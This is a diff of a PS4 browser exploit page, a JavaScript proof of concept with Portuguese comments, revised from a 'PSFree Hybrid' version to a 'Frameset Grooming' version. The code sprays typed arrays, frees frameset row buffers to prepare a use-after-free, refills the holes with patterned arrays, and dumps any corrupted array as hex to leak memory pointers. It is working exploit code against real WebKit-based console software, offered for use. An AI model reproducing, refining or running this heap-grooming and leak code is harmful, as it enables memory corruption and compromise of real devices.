@@ -1,83 +1,92 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 PSFree-Hybrid - Leandro</title>
+    <title>PS4 Frameset Grooming - Leandro</title>
 </head>
 <body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - PSFree Hybrid Leak</h1>
+    <h1>PS4 12.00 - Frameset Grooming (PSFree Style)</h1>
     <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>
 
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Iframe (PSFree Spray)</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar e Vazar (Deep)</button>
+    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Base (Pai)</button>
+    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Grooming)</button>
+    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar e Vazar</button>
 
     <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 10px; max-height: 400px; overflow-y: scroll;"></div>
+    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 10px;"></div>
     <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
-        const PATTERN = 2.121995791e-314; // 0x41414141...
+        const PATTERN = 2.121995791e-314; 
         let controllers = [];
         const statusPai = document.getElementById('status-pai');
-        const leakOutput = document.getElementById('leak-output');
 
-        // PASSO 1: Preparação com Alinhamento de 16 bytes (Baseado no PSFree)
         function prepareObjects() {
             controllers = [];
+            // O PSFree usa objetos alinhados. Vamos usar 64 offsets (512 bytes)
             for(let i = 0; i < 5000; i++) {
-                // Usamos tamanho 32 para garantir alinhamento no Heap
-                let arr = new Float64Array(32); 
+                let arr = new Float64Array(64);
                 arr[0] = i; 
                 controllers.push(arr);
             }
             statusPai.innerText = "5000 Objetos Alinhados Prontos.";
             statusPai.style.color = "blue";
-            leakOutput.style.display = "none";
         }
 
-        // PASSO 2: Spray inspirado no make_rdr do PSFree
         function setupIframe() {
             const container = document.getElementById('frame-container');
-            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:100px; border:1px solid red;"></iframe>';
+            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
             const frame = document.getElementById('pocFrame');
             const fDoc = frame.contentWindow.document;
 
             fDoc.open();
             fDoc.write(`
-                <html><body><button onclick="st()">START FS + OPTIONS</button>
-                <script>
-                    function st() {
-                        document.documentElement.webkitRequestFullscreen();
-                        window.onblur = function() {
-                            let spray = [];
-                            // Spray de Strings e Objetos de Erro para sujar o Heap
-                            for(let i = 0; i < 8000; i++) {
-                                // Técnica: String Padding do PSFree
-                                let pad = "B".repeat(64) + i; 
-                                // Força a criação de um StringImpl real via Error object
-                                let msg = new Error(pad).message; 
-                                spray.push(msg);
-
-                                // Intercala com o Float64Array de colisão
-                                let p = new Float64Array(32).fill(${PATTERN});
-                                spray.push(p);
-                            }
+                <html><body>
+                    <button onclick="startGrooming()">INICIAR GROOMING (FS + OPTIONS)</button>
+                    <script>
+                        function startGrooming() {
+                            document.documentElement.webkitRequestFullscreen();
                             
-                            setTimeout(() => {
-                                document.open();
-                                document.write('<h1>FINALIZADO</h1>');
-                                document.close();
-                            }, 500); 
-                        };
-                    }
-                <\/script></body></html>
+                            window.onblur = function() {
+                                // LÓGICA PSFREE: Alocação via Frameset
+                                // O "rows" com 8 vírgulas gera um objeto de ~80 bytes (ssv_len)
+                                let rows = ",".repeat(8); 
+                                let fsets = [];
+                                
+                                // 1. Preenchemos a SmallLine com framesets
+                                for (let i = 0; i < 2000; i++) {
+                                    let fs = document.createElement("frameset");
+                                    fs.rows = rows;
+                                    fsets.push(fs);
+                                }
+
+                                // 2. Liberamos metade para criar "buracos" (UAF Preparation)
+                                for (let i = 500; i < 1500; i++) {
+                                    fsets[i].rows = "";
+                                }
+
+                                // 3. Disparamos o spray de colisão nos buracos criados
+                                let spray = [];
+                                for(let i = 0; i < 4000; i++) {
+                                    spray.push(new Float64Array(64).fill(${PATTERN}));
+                                }
+
+                                setTimeout(() => {
+                                    document.open();
+                                    document.write('<h1>GROOMING COMPLETE</h1>');
+                                    document.close();
+                                }, 500); 
+                            };
+                        }
+                    <\/script>
+                </body></html>
             `);
             fDoc.close();
+            statusPai.innerText = "Iframe com lógica Frameset pronto.";
         }
 
-        // PASSO 3: Verificação com detecção de ponteiros
         function checkPersistence() {
             let corrupted = null;
             let corruptedIndex = -1;
@@ -91,25 +100,21 @@
             }
 
             if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: ID: " + corruptedIndex + "</span>";
-                leakOutput.style.display = "block";
-                leakOutput.innerHTML = "<b>[ PSFREE-STYLE DUMP ]</b><br>";
-
-                for(let i = 0; i < 32; i++) {
-                    const val = corrupted[i];
+                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Corrupção Detectada!</span>";
+                const output = document.getElementById('leak-output');
+                output.style.display = "block";
+                output.innerHTML = "<b>[ PSFREE MINI-DUMP ]</b><br>";
+                for(let i = 0; i < 64; i++) {
                     const buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = val;
+                    new Float64Array(buf)[0] = corrupted[i];
                     const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
-                    
-                    // Identifica ponteiros (Não-zero e Não-A)
-                    let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141") && !hex.includes("424242"));
+                    let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141"));
                     let style = isInteresting ? "color:#fff; background:#a00; padding:2px;" : "";
-                    
-                    let br = (i % 4 === 3) ? "<br>" : "";
-                    leakOutput.innerHTML += "O[" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
+                    output.innerHTML += "O["+i+"]: <span style='" + style + "'>0x" + hex + "</span> | ";
+                    if (i % 4 === 3) output.innerHTML += "<br>";
                 }
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Tente reiniciar o navegador.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Memória limpa pelo GC.</span>";
             }
         }
     </script>
